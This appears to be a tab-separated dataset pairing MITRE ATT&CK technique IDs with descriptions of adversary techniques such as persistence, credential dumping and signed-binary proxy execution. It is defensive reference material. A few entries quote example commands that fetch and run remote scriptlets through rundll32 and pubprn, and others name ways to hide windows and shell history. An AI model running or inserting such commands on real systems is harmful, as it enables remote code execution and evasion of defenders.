"ttp"	"description"
"t1037"	"adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. these scripts can vary based on operating system and whether applied locally or remotely.  

adversaries may use these scripts to maintain persistence on a single system. depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. 

an adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges."
"t1557"	"adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle aitm technique to support follow-on behaviors such as network sniffing or transmitted data manipulation. by abusing features of common networking protocols that can determine the flow of network traffic e.g. arp, dns, llmnr, etc., adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.citation: rapid7 mitm basics

for example, adversaries may manipulate victim dns settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.citation: ttint_ratcitation: dns_changer_trojanscitation: ad_blocker_with_miner adversaries may also manipulate dns and leverage their position in order to intercept user credentials and session cookies.citation: volexity_0day_sophos_fw downgrade attacks can also be used to establish an aitm position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol ssl/tls or encryption algorithm.citation: mitm_tls_downgrade_attcitation: taxonomy_downgrade_att_tlscitation: tlseminar_downgrade_att

adversaries may also leverage the aitm position to attempt to monitor and/or modify traffic, such as in transmitted data manipulation. adversaries can setup a position similar to aitm to prevent traffic from flowing to the appropriate destination, potentially to impair defenses and/or in support of a network denial of service."
"t1033"	"adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. they may do this, for example, by retrieving account usernames or by using os credential dumping. the information may be collected in a number of different ways using other discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. adversaries may use the information from system owner/user discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

various utilities and commands may acquire this information, including whoami. in macos and linux, the currently logged in user can be identified with w and who. on macos the dscl . list /users | grep -v '_' command can also be used to enumerate user accounts. environment variables, such as %username% and $user, may also be used to access this information."
"t1583"	"adversaries may buy, lease, or rent infrastructure that can be used during targeting. a wide variety of infrastructure exists for hosting and orchestrating adversary operations. infrastructure solutions include physical or cloud servers, domains, and third-party web services.citation: trendmicrohideoutslease additionally, botnets are available for rent or purchase.

use of these infrastructure solutions allows an adversary to stage, launch, and execute an operation. solutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services. depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down."
"t1218.011"	"adversaries may abuse rundll32.exe to proxy execution of malicious code. using rundll32.exe, vice executing directly i.e. shared modules, may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. rundll32.exe is commonly associated with executing dll payloads ex: rundll32.exe {dllname, dllfunction}.

rundll32.exe can also be used to execute control panel item files .cpl through the undocumented shell32.dll functions control_rundll and control_rundllasuser. double-clicking a .cpl file also causes rundll32.exe to execute. citation: trend micro cpl

rundll32 can also be used to execute scripts such as javascript. this can be done using a syntax similar to this: rundll32.exe javascript:""\\..\\mshtml,runhtmlapplication "";document.write;getobject""script:https://www.example.com/malicious.sct""""  this behavior has been seen used by malware such as poweliks. citation: this is security command line confusion

adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads dll function names. as part of windows compatibility support for various character sets, rundll32.exe will first check for wide/unicode then ansi character-supported functions before loading the specified function e.g., given the command rundll32.exe exampledll.dll, examplefunction, rundll32.exe would first attempt to execute examplefunctionw, or failing that examplefunctiona, before loading examplefunction. adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending w and/or a to harmless ones.citation: attackify rundll32.exe obscuritycitation: github norundll dll functions can also be exported and executed by an ordinal number ex: rundll32.exe file.dll,#1.

additionally, adversaries may use masquerading techniques such as changing dll file names, file extensions, or function names to further conceal execution of a malicious payload.citation: rundll32.exe defense evasion "
"t1613"	"adversaries may attempt to discover containers and other resources that are available within a containers environment. other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.

these resources can be viewed within web applications such as the kubernetes dashboard or can be queried via the docker and kubernetes apis.citation: docker apicitation: kubernetes api in docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. the discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. "
"t1583.007"	"adversaries may purchase and configure serverless cloud infrastructure, such as cloudflare workers or aws lambda functions, that can be used during targeting. by utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.

once acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to proxy traffic to an adversary-owned command and control server.citation: blackwater malware cloudflare workerscitation: aws lambda redirector as traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.citation: detecting command & control in the cloudcitation: blackwater malware cloudflare workers"
"t1143"	"adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. in some cases, windows that would typically be displayed when an application carries out an operation can be hidden. this may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.

### windows
there are a variety of features in scripting languages in windows, such as powershell, jscript, and vbscript to make windows hidden. one example of this is powershell.exe -windowstyle hidden.  citation: powershell about 2019

### mac
the configurations for how applications run on macos are listed in property list plist files. one of the tags in these files can be apple.awt.uielement, which allows for java applications to prevent the application's icon from appearing in the dock. a common use for this is when applications run in the system tray, but don't also want to show up in the dock. however, adversaries can abuse this feature and hide their running window.citation: antiquated mac malware
"
"t1161"	"mach-o binaries have a series of headers that are used to perform certain operations when a binary is loaded. the lc_load_dylib header in a mach-o binary tells macos and os x which dynamic libraries dylibs to load during execution time. these can be added ad-hoc to the compiled binary as long adjustments are made to the rest of the fields and dependencies citation: writing bad malware for osx. there are tools available to perform these changes. any changes will invalidate digital signatures on binaries because the binary is being modified. adversaries can remediate this issue by simply removing the lc_code_signature command from the binary so that the signature isn’t checked at load time citation: malware persistence on os x."
"t1132.001"	"adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. command and control c2 information can be encoded using a standard data encoding system that adheres to existing protocol specifications. common data encoding schemes include ascii, unicode, hexadecimal, base64, and mime.citation: wikipedia binary-to-text encoding citation: wikipedia character encoding some data encoding systems may also result in data compression, such as gzip."
"t1027.009"	"adversaries may embed payloads within other files to conceal malicious content from defenses. otherwise seemingly benign files such as scripts and executables may be abused to carry and obfuscate malicious payloads and content. in some cases, embedded payloads may also enable adversaries to subvert trust controls by not impacting execution controls such as digital signatures and notarization tickets.citation: sentinel labs 

adversaries may embed payloads in various file formats to hide payloads.citation: microsoft learn this is similar to steganography, though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.citation: github psimage 

for example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.citation: securelist dtrack2 adversaries have also been observed nesting payloads such as executables and run-only scripts inside a file of the same format.citation: sentinellabs reversing run-only applescripts 2021 

embedded content may also be used as process injection payloads used to infect benign system processes.citation: trend micro these embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting c2 communications in support of an orchestrator module. for example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.citation: malware analysis report comrat"
"t1150"	"property list plist files contain all of the information that macos and os x uses to configure applications and services. these files are utf-8 encoded and formatted like xml documents via a series of keys surrounded by < >. they detail when programs should execute, file paths to the executables, program arguments, required os permissions, and many others. plists are located in certain locations depending on their purpose such as /library/preferences which execute with elevated privileges and ~/library/preferences which execute with a user's privileges. 
adversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism. citation: sofacy komplex trojan"
"t1556.003"	"adversaries may modify pluggable authentication modules pam to access user credentials or enable otherwise unwarranted access to accounts. pam is a modular system of configuration files, libraries, and executable files which guide authentication for many services. the most common authentication module is pam_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow.citation: apple pamcitation: man pam_unixcitation: red hat pam

adversaries may modify components of the pam system to create backdoors. pam components, such as pam_unix.so, can be patched to accept arbitrary adversary supplied values as legitimate credentials.citation: pam backdoor

malicious modifications to the pam system may also be abused to steal credentials. adversaries may infect pam resources with code to harvest user credentials, since the values exchanged with pam components may be plain-text since pam does not store passwords.citation: pam credscitation: apple pam"
"t1578.004"	"an adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. in highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine vm or data storage snapshots through the cloud management dashboard or cloud apis.

another variation of this technique is to utilize temporary storage attached to the compute instance. most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the vm.citation: tech republic - restore aws snapshotscitation: google - restore cloud snapshot"
"t1148"	"the histcontrol environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. this setting can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"". histcontrol can also be set to ignore duplicate commands by setting it to ""ignoredups"". in some linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. this means that “ ls” will not be saved, but “ls” would be saved by history. histcontrol does not exist by default on macos, but can be set by the user and will be respected. adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands."
"t1592"	"adversaries may gather information about the victim's hosts that can be used during targeting. information about hosts may include a variety of details, including administrative data ex: name, assigned ip, functionality, etc. as well as specifics regarding its configuration ex: operating system, language, etc..

adversaries may gather this information in various ways, such as direct collection actions via active scanning or phishing for information. adversaries may also compromise sites then include malicious content designed to collect host information from visitors.citation: att scanbox information about hosts may also be exposed to adversaries via online or other accessible data sets ex: social media or search victim-owned websites. gathering this information may reveal opportunities for other forms of reconnaissance ex: search open websites/domains or search open technical databases, establishing operational resources ex: develop capabilities or obtain capabilities, and/or initial access ex: supply chain compromise or external remote services."
"t1596.003"	"adversaries may search public digital certificate data for information about victims that can be used during targeting. digital certificates are issued by a certificate authority ca in order to cryptographically verify the origin of signed content. these certificates, such as those used for encrypted web traffic https ssl/tls communications, contain information about the registered organization such as name and location.

adversaries may search digital certificate data to gather actionable information. threat actors can use online resources and lookup tools to harvest information about certificates.citation: sslshopper lookup digital certificate data may also be available from artifacts signed by the organization ex: certificates used from encrypted web traffic are served with content.citation: medium ssl cert information from these sources may reveal opportunities for other forms of reconnaissance ex: active scanning or phishing for information, establishing operational resources ex: develop capabilities or obtain capabilities, and/or initial access ex: external remote services or trusted relationship."
"t1056.001"	"adversaries may log user keystrokes to intercept credentials as the user types them. keylogging is likely to be used to acquire credentials for new access opportunities when os credential dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.

keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.citation: adventures of a keystroke some methods include:

* hooking api callbacks used for processing keystrokes. unlike credential api hooking, this focuses solely on api functions intended for processing keystroke data.
* reading raw keystroke data from the hardware buffer.
* windows registry modifications.
* custom drivers.
* modify system image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.citation: cisco blog legacy device attacks "
"t1222.002"	"adversaries may modify file or directory permissions/attributes to evade access control lists acls and access protected files.citation: hybrid analysis icacls1 june 2018citation: hybrid analysis icacls2 may 2018 file and directory permissions are commonly managed by acls configured by the file or directory owner, or users with the appropriate permissions. file and directory acl implementations vary by platform, but generally explicitly designate which users or groups can perform which actions read, write, execute, etc..

most linux and linux-based platforms provide a standard set of permission groups user, group, and other and a standard set of permissions read, write, and execute that are applied to each group. while nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory acls: chown short for change owner, and chmod short for change mode.

adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. they could subsequently lock others out of the file. specific file and directory modifications may be a required step for many techniques, such as establishing persistence via unix shell configuration modification or tainting/hijacking other instrumental binary/configuration files via hijack execution flow.citation: 20 macos common tools and techniques "
"t1110.001"	"adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. an adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.

guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. citation: cylance cleaver

typically, management services over commonly used ports are used when guessing passwords. commonly targeted services include the following:

* ssh 22/tcp
* telnet 23/tcp
* ftp 21/tcp
* netbios / smb / samba 139/tcp & 445/tcp
* ldap 389/tcp
* kerberos 88/tcp
* rdp / terminal services 3389/tcp
* http/http management services 80/tcp & 443/tcp
* mssql 1433/tcp
* oracle 1521/tcp
* mysql 3306/tcp
* vnc 5900/tcp
* snmp 161/udp and 162/tcp/udp

in addition to management services, adversaries may ""target single sign-on sso and cloud-based applications utilizing federated authentication protocols,"" as well as externally facing email applications, such as office 365.citation: us-cert ta18-068a 2018. further, adversaries may abuse network device interfaces such as `wlanapi` to brute force accessible wifi-routers via wireless authentication protocols.citation: trend micro emotet 2020

in default environments, ldap and kerberos connection attempts are less likely to trigger events over smb, which creates windows ""logon failure"" event id 4625."
"t1216.001"	"adversaries may use pubprn to proxy execution of malicious remote files. pubprn.vbs is a visual basic script that publishes a printer to active directory domain services. the script may be signed by microsoft and is commonly executed through the windows command shell via cscript.exe. for example, the following code publishes a printer within the specified domain: cscript pubprn printer1 ldap://cn=container1,dc=domain1,dc=com.citation: pubprn

adversaries may abuse pubprn to execute malicious payloads hosted on remote sites.citation: enigma0x3 pubprn bypass to do so, adversaries may set the second script: parameter to reference a scriptlet file .sct hosted on a remote site. an example command is pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct. this behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.

in later versions of windows 10+, pubprn.vbs has been updated to prevent proxying execution from a remote site. this is done by limiting the protocol specified in the second parameter to ldap://, vice the script: moniker which could be used to reference remote code via https."
"t1597.002"	"adversaries may purchase technical information about victims that can be used during targeting. information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.

adversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure.citation: zdnet selling data information from these sources may reveal opportunities for other forms of reconnaissance ex: phishing for information or search open websites/domains, establishing operational resources ex: develop capabilities or obtain capabilities, and/or initial access ex: external remote services or valid accounts."
"t1003"	"adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. credentials can then be used to perform lateral movement and access restricted information.

several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. additional custom tools likely exist as well.
"
"t1129"	"adversaries may execute malicious payloads via loading shared modules. the windows module loader can be instructed to load dlls from arbitrary local paths and arbitrary universal naming convention unc network paths. this functionality resides in ntdll.dll and is part of the windows native api which is called from functions like createprocess, loadlibrary, etc. of the win32 api.citation: wikipedia windows library files

the module loader can load dlls:

* via specification of the fully-qualified or relative dll pathname in the import directory;
    
* via export forwarded to another dll, specified with fully-qualified or relative pathname but without extension;
    
* via an ntfs junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the dlls specified in the import directory or forwarded exports;
    
* via &#x3c;file name=""filename.extension"" loadfrom=""fully-qualified or relative pathname""&#x3e; in an embedded or external ""application manifest"". the file name refers to an entry in the import directory or a forwarded export.

adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. for example, malware may execute share modules to load additional components or features."
"t1602"	"adversaries may collect data related to managed devices from configuration repositories. configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. configuration repositories may also facilitate remote access and administration of devices.

adversaries may target these repositories in order to collect large quantities of sensitive system administration data. data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary discovery objectives.citation: us-cert-ta18-106acitation: us-cert ta17-156a snmp abuse 2017"
"t1561.002"	"adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. 

adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record mbr or partition table.citation: symantec shamoon 2012citation: fireeye shamoon nov 2016citation: palo alto shamoon nov 2016citation: kaspersky stonedrill 2017citation: unit 42 shamoon3 2018 the data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. if this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. disk structure wipe may be performed in isolation, or along with disk content wipe if all sectors of a disk are wiped.

to maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like valid accounts, os credential dumping, and smb/windows admin shares.citation: symantec shamoon 2012citation: fireeye shamoon nov 2016citation: palo alto shamoon nov 2016citation: kaspersky stonedrill 2017"
"t1498.001"	"adversaries may attempt to cause a denial of service dos by directly sending a high-volume of network traffic to a target. this dos attack may also reduce the availability and functionality of the targeted systems and network. direct network floods are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. almost any network protocol may be used for flooding. stateless protocols such as udp or icmp are commonly used but stateful protocols such as tcp can be used as well.

botnets are commonly used to conduct network flooding attacks against networks and services. large botnets can generate a significant amount of traffic from systems spread across the global internet. adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. in some of the worst cases for distributed dos ddos, so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. in such circumstances, distinguishing ddos traffic from legitimate clients becomes exceedingly difficult. botnets have been used in some of the most high-profile ddos flooding attacks, such as the 2012 series of incidents that targeted major us banks.citation: usnyag iranianbotnet march 2016"
"t1492"	"adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.citation: fireeye apt38 oct 2018citation: doj lazarus sony 2018 by manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. 

stored data could include a variety of file formats, such as office files, databases, stored emails, and custom file formats. the type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. for complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact."
"t1574.007"	"adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. adversaries may place a program in an earlier entry in the list of directories stored in the path environment variable, which windows will then execute when it searches sequentially through that path listing in search of the binary that was called from a script or the command line.

the path environment variable contains a list of directories. certain methods of executing a program namely using cmd.exe or the command-line rely solely on the path environment variable to determine the locations that are searched for a program when the path for the program is not given. if any directories are listed in the path environment variable before the windows directory, %systemroot%\\system32 e.g., c:\\windows\\system32, a program may be placed in the preceding directory that is named the same as a windows program such as cmd, powershell, or python, which will be executed when that command is executed from a script or command-line.

for example, if c:\\example path precedes c:\\windows\\system32 is in the path environment variable, a program that is named net.exe and placed in c:\\example path will be called instead of the windows system ""net"" when ""net"" is executed from the command-line."
